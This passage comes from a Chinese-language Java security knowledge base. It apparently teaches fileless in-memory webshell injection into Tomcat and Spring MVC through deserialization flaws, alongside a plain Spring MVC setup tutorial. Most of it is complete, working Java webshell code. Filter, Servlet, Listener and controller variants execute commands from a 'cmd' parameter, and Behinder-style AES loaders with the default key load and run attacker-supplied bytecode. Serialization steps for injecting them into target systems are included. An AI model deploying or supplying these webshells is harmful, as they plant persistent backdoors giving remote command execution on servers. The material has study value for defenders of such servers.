HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse)servletResponse; HttpSession session = request.getSession(); //create pageContext HashMap pageContext = new HashMap(); pageContext.put(\"request\",request); pageContext.put(\"response\",response); pageContext.put(\"session\",session); if (request.getMethod().equals(\"POST\")) { String k = \"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/ session.putValue(\"u\", k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(k.getBytes(), \"AES\")); //revision BehinderFilter Method method = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); method.setAccessible(true); byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())); Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length); evilclass.newInstance().equals(pageContext); } }catch (Exception e){ e.printStackTrace(); } filterChain.doFilter(servletRequest, servletResponse); System.out.println(\"doFilter\"); } 编译生成对应的TomcatEcho.class,TomcatInject.class，然后通过序列化生成对应的TomcatEcho.ser,TomcatInject.ser,最后通过反序列化漏洞直接在目标web系统中反序列化最后成功注入冰蝎马 反序列化注入Servlet 在Tomcat基础内存马入门中，Tomcat注入内存马中除了注入Filter，还可以注入Servlet 其中基本思路不变，只是需要获取request，然后从request中获取ServletContext，然后依次获取ApplicationContext、StandardContext，最后将servlet封装成wrapper再使用context添加ServletMapping，就可以了 注入普通马 package com.fastjson.test; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; /** * @author threedr3am */ public class TomcatEcho extends AbstractTranslet { static { try { /*刚开始反序列化后执行的逻辑*/ //修改 WRAP_SAME_OBJECT 值为 true Class c = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\"); java.lang.reflect.Field f = c.getDeclaredField(\"WRAP_SAME_OBJECT\"); java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (!f.getBoolean(null)) { f.setBoolean(null, true); } //初始化 lastServicedRequest c = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); f = c.getDeclaredField(\"lastServicedRequest\"); modifiersField = f.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (f.get(null) == null) { f.set(null, new ThreadLocal()); } //初始化 lastServicedResponse f = c.getDeclaredField(\"lastServicedResponse\"); modifiersField = f.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (f.get(null) == null) { f.set(null, new ThreadLocal()); } } catch (Exception e) { e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 在这里需要注意的是，TomcatInjectServlet 需要实现Servlet接口，和Filter一样，因为需要被TemplatesImpl类来加载，所以需要继承AbstractTranslet类 package com.fastjson.test; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import javax.servlet.*; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.Method; public class TomcatInjectServlet extends AbstractTranslet implements Servlet { /** * webshell命令参数名 */ private final static String servletUrlPattern = \"/*\"; private final static String servletName = \"test\"; static { try { ServletContext servletContext = getServletContext(); if (servletContext != null) { Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); Servlet demo = new TomcatInjectServlet(); org.apache.catalina.Wrapper demoWrapper = standardContext.createWrapper(); //设置Servlet名等 demoWrapper.setName(servletName); demoWrapper.setLoadOnStartup(1); demoWrapper.setServlet(demo); demoWrapper.setServletClass(demo.getClass().getName()); standardContext.addChild(demoWrapper); //设置ServletMap standardContext.addServletMapping(servletUrlPattern, servletName); } } catch (Exception e) { e.printStackTrace(); } } private static ServletContext getServletContext() throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException { ServletRequest servletRequest = null; /*shell注入，前提需要能拿到request、response等*/ Class c = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); java.lang.reflect.Field f = c.getDeclaredField(\"lastServicedRequest\"); f.setAccessible(true); ThreadLocal threadLocal = (ThreadLocal) f.get(null); //不为空则意味着第一次反序列化的准备工作已成功 if (threadLocal != null && threadLocal.get() != null) { servletRequest = (ServletRequest) threadLocal.get(); } //如果不能去到request，则换一种方式尝试获取 //spring获取法1 if (servletRequest == null) { try { c = Class.forName(\"org.springframework.web.context.request.RequestContextHolder\"); Method m = c.getMethod(\"getRequestAttributes\"); Object o = m.invoke(null); c = Class.forName(\"org.springframework.web.context.request.ServletRequestAttributes\"); m = c.getMethod(\"getRequest\"); servletRequest = (ServletRequest) m.invoke(o); } catch (Throwable t) { } } if (servletRequest != null) return servletRequest.getServletContext(); //spring获取法2 try { c = Class.forName(\"org.springframework.web.context.ContextLoader\"); Method m = c.getMethod(\"getCurrentWebApplicationContext\"); Object o = m.invoke(null); c = Class.forName(\"org.springframework.web.context.WebApplicationContext\"); m = c.getMethod(\"getServletContext\"); ServletContext servletContext = (ServletContext) m.invoke(o); return servletContext; } catch (Throwable t) { } return null; } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } @Override public void init(ServletConfig servletConfig) throws ServletException { } @Override public ServletConfig getServletConfig() { return null; } @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { String cmd = servletRequest.getParameter(\"cmd\"); if (cmd != null) { System.out.println(\"do Service\"); Process process = Runtime.getRuntime().exec(cmd); java.io.BufferedReader bufferedReader = new java.io.BufferedReader( new java.io.InputStreamReader(process.getInputStream())); StringBuilder stringBuilder = new StringBuilder(); String line; while ((line = bufferedReader.readLine()) != null) { stringBuilder.append(line + '\\n'); } servletResponse.getOutputStream().write(stringBuilder.toString().getBytes()); servletResponse.getOutputStream().flush(); servletResponse.getOutputStream().close(); return; } } @Override public String getServletInfo() { return null; } @Override public void destroy() { } } 编译生成对应的TomcatEcho.class,TomcatInjectServlet.class，然后通过序列化生成对应的TomcatEcho.ser,TomcatInjectServlet.ser,最后通过反序列化漏洞直接在目标web系统中反序列化最后成功注入 注入冰蝎马 在这里使用/xyz用于区别Filter的冰蝎马，实现原理同Filter，只是实现Servlet接口中的service()方法 @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { try { System.out.println(\"do service\"); // 获取request和response对象 HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse) servletResponse; HttpSession session = request.getSession(); //create pageContext HashMap pageContext = new HashMap(); pageContext.put(\"request\", request); pageContext.put(\"response\", response); pageContext.put(\"session\", session); if (request.getMethod().equals(\"POST\")) { String k = \"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/ session.putValue(\"u\", k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(k.getBytes(), \"AES\")); //revision BehinderFilter Method method = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); method.setAccessible(true); byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())); Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length); evilclass.newInstance().equals(pageContext); return; } } catch (Exception e) { e.printStackTrace(); } } 反序列化注入Listener 在Tomcat基础内存马入门中，Tomcat注入内存马中除了注入Filter，Servlet，还有Listener，但是在该篇中对request理解并不深，未深入研究是否可以回显，在此处发现可以通过request获取response @Override public void requestInitialized(ServletRequestEvent servletRequestEvent) { try{ HttpServletRequest req = (HttpServletRequest) servletRequestEvent.getServletRequest(); Field requestF = req.getClass().getDeclaredField(\"request\"); requestF.setAccessible(true); Request request = (Request)requestF.get(req); HttpServletResponse response = request.getResponse(); // 执行命令部分... }catch (Exception e){ e.printStackTrace(); } } 注入普通马 对应的TomcatInjectListener package com.fastjson.test; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.connector.Request; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import javax.servlet.ServletContext; import javax.servlet.ServletRequest; import javax.servlet.ServletRequestEvent; import javax.servlet.ServletRequestListener; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.lang.reflect.Field; import java.lang.reflect.Method; public class TomcatInjectListener extends AbstractTranslet implements ServletRequestListener { private final static String servletUrlPattern = \"/\"; private final static String servletName = \"test\"; static { try { ServletContext servletContext = getServletContext(); if (servletContext != null) { Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); ServletRequestListener listener = new TomcatInjectListener(); standardContext.addApplicationEventListener(listener); } }catch (Exception e){ e.printStackTrace(); } } private static ServletContext getServletContext() throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException { ServletRequest servletRequest = null; /*shell注入，前提需要能拿到request、response等*/ Class c = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); java.lang.reflect.Field f = c.getDeclaredField(\"lastServicedRequest\"); f.setAccessible(true); ThreadLocal threadLocal = (ThreadLocal) f.get(null); //不为空则意味着第一次反序列化的准备工作已成功 if (threadLocal != null && threadLocal.get() != null) { servletRequest = (ServletRequest) threadLocal.get(); } //如果不能去到request，则换一种方式尝试获取 //spring获取法1 if (servletRequest == null) { try { c = Class.forName(\"org.springframework.web.context.request.RequestContextHolder\"); Method m = c.getMethod(\"getRequestAttributes\"); Object o = m.invoke(null); c = Class.forName(\"org.springframework.web.context.request.ServletRequestAttributes\"); m = c.getMethod(\"getRequest\"); servletRequest = (ServletRequest) m.invoke(o); } catch (Throwable t) { } } if (servletRequest != null) return servletRequest.getServletContext(); //spring获取法2 try { c = Class.forName(\"org.springframework.web.context.ContextLoader\"); Method m = c.getMethod(\"getCurrentWebApplicationContext\"); Object o = m.invoke(null); c = Class.forName(\"org.springframework.web.context.WebApplicationContext\"); m = c.getMethod(\"getServletContext\"); ServletContext servletContext = (ServletContext) m.invoke(o); return servletContext; } catch (Throwable t) { } return null; } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } @Override public void requestDestroyed(ServletRequestEvent servletRequestEvent) { } @Override public void requestInitialized(ServletRequestEvent servletRequestEvent) { try{ HttpServletRequest req = (HttpServletRequest) servletRequestEvent.getServletRequest(); Field requestF = req.getClass().getDeclaredField(\"request\"); requestF.setAccessible(true); Request request = (Request)requestF.get(req); //通过resquest获取response HttpServletResponse response = request.getResponse(); String cmd = request.getParameter(\"cmd\"); if (cmd != null){ Process process = Runtime.getRuntime().exec(cmd); java.io.BufferedReader bufferedReader = new java.io.BufferedReader( new java.io.InputStreamReader(process.getInputStream())); StringBuilder stringBuilder = new StringBuilder(); String line; while ((line = bufferedReader.readLine()) != null) { stringBuilder.append(line + '\\n'); } response.getOutputStream().write(stringBuilder.toString().getBytes()); response.getOutputStream().flush(); response.getOutputStream().close(); return; } }catch (Exception e){ e.printStackTrace(); } } } 编译生成对应的TomcatEcho.class,TomcatInjectListener.class，然后通过序列化生成对应的TomcatEcho.ser,TomcatInjectListener.ser,最后通过反序列化漏洞直接在目标web系统中反序列化最后成功注入 注入冰蝎马 在这里只需要修改Listener的逻辑，为冰蝎马逻辑即可 @Override public void requestInitialized(ServletRequestEvent servletRequestEvent) { try{ System.out.println(\"do Linstener\"); HttpServletRequest req = (HttpServletRequest) servletRequestEvent.getServletRequest(); Field requestF = req.getClass().getDeclaredField(\"request\"); requestF.setAccessible(true); org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request)requestF.get(req); HttpServletResponse response = request.getResponse(); HttpSession session = request.getSession(); //create pageContext HashMap pageContext = new HashMap(); pageContext.put(\"request\", request); pageContext.put(\"response\", response); pageContext.put(\"session\", session); if (request.getMethod().equals(\"POST\")) { String k = \"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/ session.putValue(\"u\", k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(k.getBytes(), \"AES\")); //revision BehinderFilter Method method = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); method.setAccessible(true); byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())); Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length); evilclass.newInstance().equals(pageContext); return; } }catch (Exception e){ e.printStackTrace(); } } 参考链接 P1n93r-Tomcat 架构原理 threedr3am-基于tomcat的内存 Webshell 无文件攻击技术 天下大木头-Tomcat内存马学习（二） 洋洋-利用shiro反序列化注入冰蝎内存马 https://www.bbsmax.com/A/x9J2X9Dnd6/ Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-30 16:21:41 "},"知识库/02.JAVA安全/12.Spring框架内存马入门/":{"url":"知识库/02.JAVA安全/12.Spring框架内存马入门/","title":"12.Spring框架内存马入门","keywords":"","body":"Spring Web 介绍 Bean bean 是Spring 框架的一个核心概念，它是构建程序的主干，并且是由Spring loC 容器负责实例化、配置、组装和管理的对象。 通俗来讲 bean 是对象 bean 被 loC容器管理 Spring 应用由一个个bean构成 ApplicationContext Spring 框架中，BeanFactory 接口是 Spring loC容器的实际代表 从下面的接口继承关系图可以看出，ApplicationContext接口继承了BeanFactory接口，并通过继承其他接口进一步扩展了基本容器的功能 因此，org.springframework.context.ApplicationContext接口也代表了 IoC容器 ，它负责实例化、定位、配置应用程序中的对象(bean)及建立这些对象间(beans)的依赖 IoC容器通过读取配置元数据来获取对象的实例化、配置和组装的描述信息。配置的零元数据可以用xml、Java注解或Java代码来表示。 ContextLoaderListener 与 DispatcherServlet 下面是一个典型 Spring 应用的 web.xml 配置示例： HelloSpringMVC contextConfigLocation /WEB-INF/applicationContext.xml org.springframework.web.context.ContextLoaderListener dispatcherServlet org.springframework.web.servlet.DispatcherServlet contextConfigLocation /WEB-INF/dispatcherServlet-servlet.xml 1 dispatcherServlet / 在正式了解上面的配置前，先介绍下关于 Root Context 和 Child Context 的重要概念： Spring 应用中可以同时有多个 Context，其中只有一个 Root Context，剩下的全是 Child Context 所有Child Context都可以访问在 Root Context中定义的 bean，但是Root Context无法访问Child Context中定义的 bean 所有的Context在创建后，都会被作为一个属性添加到了 ServletContext中 ContextLoaderListener ContextLoaderListener 主要被用来初始化全局唯一的Root Context，即 Root WebApplicationContext。 这个 Root WebApplicationContext 会和其他 Child Context 实例共享它的 IoC 容器，供其他 Child Context 获取并使用容器中的 bean。 回到 web.xml 中，其相关配置如下： contextConfigLocation /WEB-INF/applicationContext.xml org.springframework.web.context.ContextLoaderListener 依照规范，当没有显式配置 ContextLoaderListener 的 contextConfigLocation 时，程序会自动寻找 /WEB-INF/applicationContext.xml，作为配置文件，所以其实上面的 标签对其实完全可以去掉。 DispatcherServlet DispatcherServlet 的主要作用是处理传入的web请求，根据配置的 URL pattern，将请求分发给正确的 Controller 和 View。 DispatcherServlet 初始化完成后，会创建一个普通的 Child Context 实例。 剩下的servlet 标签中，配置项如下 dispatcherServlet org.springframework.web.servlet.DispatcherServlet contextConfigLocation /WEB-INF/dispatcherServlet-servlet.xml 1 上面给 org.springframework.web.servlet.DispatcherServlet类设置了个别名dispatcherServlet ，并配置了它的 contextConfigLocation 参数值为 /WEB-INF/dispatcherServlet-servlet.xml 依照规范，当没有显式配置 contextConfigLocation时，程序会自动寻找 /WEB-INF/-servlet.xml，作为配置文件。因为上面的 是 dispatcherServlet，所以当没有显式配置时，程序依然会自动找到/WEB-INF/dispatcherServlet-servlet.xml配置文件 综上，可以了解到：每个具体的 DispatcherServlet 创建的是一个Child Context，代表一个独立的 IoC 容器；而 ContextLoaderListener 所创建的是一个 Root Context，代表全局唯一的一个公共IoC容器 如果要访问和操作 bean ，一般要获得当前代码执行环境的IoC容器 代表者 ApplicationContext 创建Spring MVC项目 这里使用maven创建spring mvc 项目，实现版本控制 这里选择maven-archetypes-webapp 这里记得选择本地配置好的源为aliyun的maven配置文件，这样会快一些 等待maven 下载好之后，就可以看到如下的目录结构 然后添加SpringMVC的相关包 4.0.0 org.example SpringMVC_Test 1.0-SNAPSHOT war SpringMVC_Test Maven Webapp http://www.example.com UTF-8 1.7 1.7 4.3.18.RELEASE junit junit 4.11 test org.springframework spring-core ${spring.version} org.springframework spring-web ${spring.version} org.springframework spring-oxm ${spring.version} org.springframework spring-tx ${spring.version} org.springframework spring-jdbc ${spring.version} org.springframework spring-webmvc ${spring.version} org.springframework spring-aop ${spring.version} org.springframework spring-context-support ${spring.version} org.springframework spring-test ${spring.version} SpringMVC_Test maven-clean-plugin 3.1.0 maven-resources-plugin 3.0.2 maven-compiler-plugin 3.8.0 maven-surefire-plugin 2.22.1 maven-war-plugin 3.2.2 maven-install-plugin 2.5.2 maven-deploy-plugin 2.8.2 然后添加SpringMVC框架，右键项目，点击Add Framework Support 如果在Add framework support中找不到Spring，那是因为项目中可能已经存在Spring相关文件，但不一定是完善的。因此我们要将已经存在的Spring给删掉，重新添加，方法如下： 点击Project Structure，选择Facets，就会看到有一个Spring啦，右击它，点删除就行啦，然后再回到上面第3步重新Add framework support Spring框架添加完之后，会看到目录下多了两个xml文件 下面开始配置web.xml HelloSpringMVC contextConfigLocation /WEB-INF/applicationContext.xml org.springframework.web.context.ContextLoaderListener dispatcher org.springframework.web.servlet.DispatcherServlet contextConfigLocation /WEB-INF/dispatcher-servlet.xml 1 dispatcher / 配置dispatcher-servlet.xml，负责mvc的配置 然后注意，需要在main目录中添加java、resource文件夹，并且在java目录下，添加包名com.spring.Controller,因为我们在dispatcher-servlet.xml中添加了 这个意思就是扫描com.spring.Controller包下的Controller，这样才能访问到写的Controller 最后再配置一下本地Tomcat 出现了warning，此时点击fix即可，或者 Controller 手动注册Controller 首先查看dispatcher-servlet.xml 视图路径在/WEB-INF/jsp/目录下 在/WEB-INF/jsp/目录下创建hello.jsp，isELIgnored=\"false\"这里一定要添加，否则model传过来的值，在高版本的SpringMVC中不会解析EL表达式 Title hello world ,${name} 一个正常的 Controller 示例代码如下，当用浏览器访问 /hi/say路径时，会在定义好的 View 中输出 hello world,aaron 字样 @Controller @RequestMapping(\"/hi\") public class HelloController { @RequestMapping(\"say\") public String say(Model model){ model.addAttribute(\"name\",\"aaron\"); return \"hello\"; } } 获取当前代码运行的上下文环境（dispatcherServlet） 在这里我通过使用LandGrey@观星实验室的方法获取到Root WebApplicationContext，注入也能成功，但是会报错，提示没有dispatcherServlet，也就是不能分发给对应的Controller，由于Root WebApplicationContext是无法访问到Child WebApplicationContext 定义的bean，applicationContext.xml全局配置也没有搞定，希望有大佬可以给我applicationContext.xml的相关配置，以及如何成功利用 这里使用LandGrey@观星实验室大佬的后两种获取Child Context的方法 RequestContextUtils WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()); 这里使用RequestContextUtils中的WebApplicationContext getWebApplicationContext(ServletRequest request)方法，通过 ServletRequest类的实例来获取WebApplicationContext 当拿到了这个WebApplicationContext之后，就需要在当前的context里注册Controller，然后给这个Controller绑定对应可解析的url，以及方法 public class InjectController { public InjectController() { // 从context中获得 RequestMappingHandlerMapping 的实例 RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class); // 通过反射获得自定义 controller 中的 Method 对象 Method method = Class.forName(\"com.spring.Controller.InjectController\").getMethod(\"test\"); // 定义访问 controller 的 URL 地址 PatternsRequestCondition url = new PatternsRequestCondition(\"/ccc\"); // 定义允许访问 controller 的 HTTP 方法（GET/POST） RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 在内存中动态注册 controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); com.spring.Controller.InjectController injectToController = new com.spring.Controller.InjectController(); requestMappingHandlerMapping.registerMapping(info, injectToController, method); } public void test(){ xxx } } 在test方法中，需要实现我们的webshell的逻辑，首先需要完善webshell java.lang.Runtime.getRuntime().exec(\"command\"); 然后在将command变成我们可控制的，也就是传入可控参数，这时就需要获取当前的request和response，command 为request.getParamer(\"cmd\")就为可控参数了，所以就是获取request，response的问题了，这里我们使用spring提供获取request，response的方法，这里使用如下方法 HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); test方法可以使用如下表示 public void test() throws IOException { // 获取request和response对象 HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); // 获取cmd参数并执行命令 java.lang.Runtime.getRuntime().exec(request.getParameter(\"cmd\")); } getAttribute WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); 同上，因为获取的都是Child WebApplicationContext 阻止重复添加controller (非必须) 这里使用bitterz大佬的代码 上面获取的requestMappingHandlerMapping中有一个mappingRegistry成员对象，而该对象下的urlLookup属性保存了已经注册的所有url路径，对mappingHandlerMapping进一步后发现，以上对象和属性都是私有的，且mappingRegistry并非mappingHandlerMapping中创建的，而是来自于基类AbstractHandlerMethodMapping。 AbstractHandlerMethodMapping基类的getMappingRegistry方法可以获取mappingRegistry，而urlLookup是其内部类MappingRegistry的私有属性，可以通过反射获取，反射获取urlLookup和判断我们给定的url是否被注册的代码块如下 // 获取abstractHandlerMethodMapping对象，以便反射调用其getMappingRegistry方法 AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class); // 反射调用getMappingRegistry方法 Method method = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping\").getDeclaredMethod(\"getMappingRegistry\"); method.setAccessible(true); Object mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping); // 反射获取urlLookup属性 Field field = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry\").getDeclaredField(\"urlLookup\"); field.setAccessible(true); Map urlLookup = (Map) field.get(mappingRegistry); // 判断我们想要注入的路径是否被已经存在 Iterator urlIterator = urlLookup.keySet().iterator(); List urls = new ArrayList(); while (urlIterator.hasNext()){ String urlPath = (String) urlIterator.next(); if (\"/malicious\".equals(urlPath)){ System.out.println(\"url已存在\"); return; } } 实例(添加Controller) 0x1 注入普通马 在上述知道了具体的操作方法，我在这里使用一个手动注册的Controller，里面包含恶意代码，这样来模拟一下无文件内存马 package com.spring.Controller; import org.springframework.beans.factory.NoSuchBeanDefinitionException; import org.springframework.stereotype.Controller; import org.springframework.ui.Model; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.context.request.ServletRequestAttributes; import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping; import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition; import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition; import org.springframework.web.servlet.mvc.method.RequestMappingInfo; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.util.ArrayList; import java.util.Iterator; import java.util.List; import java.util.Map; @Controller public class HelloWorldController { public HelloWorldController() {} public void test() throws IOException { // 获取request和response对象 HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); // 获取cmd参数并执行命令 java.lang.Runtime.getRuntime().exec(request.getParameter(\"cmd\")); } @RequestMapping(value = \"/hello\") public String hello(Model model) throws NoSuchBeanDefinitionException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, NoSuchFieldException { WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); // 2. 从context中获得 RequestMappingHandlerMapping 的实例 RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); // 判断url是否存在 AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class); Method method = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping\").getDeclaredMethod(\"getMappingRegistry\"); method.setAccessible(true); Object mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping); Field field = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry\").getDeclaredField(\"urlLookup\"); field.setAccessible(true); Map urlLookup = (Map) field.get(mappingRegistry); Iterator urlIterator = urlLookup.keySet().iterator(); List urls = new ArrayList(); while (urlIterator.hasNext()){ String urlPath = (String) urlIterator.next(); if (\"/test\".equals(urlPath)){ System.out.println(\"url已存在\"); return \"hello\"; } } // 可选步骤，判断url是否存在 // 2. 通过反射获得自定义 controller 中test的 Method 对象 Method method2 = HelloWorldController.class.getMethod(\"test\"); // 3. 定义访问 controller 的 URL 地址 PatternsRequestCondition url = new PatternsRequestCondition(\"/test\"); // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST） RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 5. 在内存中动态注册 controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); // 创建用于处理请求的对象 HelloWorldController injectToController = new HelloWorldController(); mappingHandlerMapping.registerMapping(info, injectToController, method2); model.addAttribute(\"name\",\"aaron\"); return \"hello\"; } } 目录结构如下，其中com.spring.Controller包的俩controller分别是两种获取Child WebApplicationContext的方法实现 在代码中可以看到，访问/hello，就会执行hello方法，然后就会动态注入url=>/test，以及controller(test方法) 0x2 注入冰蝎马 冰蝎马如下 可以看出，该jsp的核心功能有三点 为了方便地使用defineClass，创建了U这个类继承ClassLoader； 使用java自带的包，解密AES加密数据 使用defineClass加载AES解密后字节码，获得一个恶意类，利用newInstance创建这个类的实例，并调用equals方法 要特别注意pageContext这个对象，它是jsp文件运行过程中自带的对象，可以获取request/response/session这三个包含页面信息的重要对象，对应pageContext有getRequest/getResponse/getSession方法，所以注入的controller代码中，可以将pageContext换成一个Map，手动添加key和value即可。 冰蝎马需要继承ClassLoader后调用父类的defineClass，当然也可以用反射，但是这样更方便而已。对恶意类稍加改造，继承ClassLoader、定义新的构造函数、增加g函数、添加冰蝎的服务端代码 基本逻辑 public HttpServletResponse test() throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IOException, BadPaddingException, IllegalBlockSizeException, IllegalAccessException, InstantiationException { HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); HttpSession session = request.getSession(); if (request.getMethod().equals(\"POST\")) { session.setAttribute(\"u\", this.k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(this.k.getBytes(), \"AES\")); HelloWorldController helloWorldController = new HelloWorldController(ClassLoader.getSystemClassLoader()); String base64String = request.getReader().readLine(); byte[] bytesEncrypted = new sun.misc.BASE64Decoder().decodeBuffer(base64String); byte[] bytesDecrypted = c.doFinal(bytesEncrypted); Class newClass = helloWorldController.g(bytesDecrypted); Map pageContext = new HashMap(); pageContext.put(\"session\", session); pageContext.put(\"request\", request); pageContext.put(\"response\", response); newClass.newInstance().equals(pageContext); } return response; } 完整代码如下： package com.spring.Controller; import org.springframework.stereotype.Controller; import org.springframework.ui.Model; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.context.WebApplicationContext; import 